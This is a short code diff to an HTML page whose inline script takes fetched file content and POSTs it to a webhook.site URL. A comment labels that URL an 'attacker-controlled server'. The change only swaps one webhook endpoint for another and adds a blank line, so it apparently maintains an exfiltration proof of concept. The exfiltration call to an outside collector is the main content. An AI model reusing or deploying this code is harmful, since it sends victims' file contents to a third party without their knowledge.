@@ -14,7 +14,7 @@
       .then(response => response.text())
       .then(data => {
         // If successful, send the content to attacker-controlled server
-        fetch('https://webhook.site/cedb34be-076a-460e-92b9-67db64333583', {
+        fetch('https://webhook.site/10826aa7-1ffb-41fd-ad7f-f589f9ae80d6', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ fileContent: data })
@@ -26,4 +26,5 @@
   </script>
 </body>
 </html>
+
 
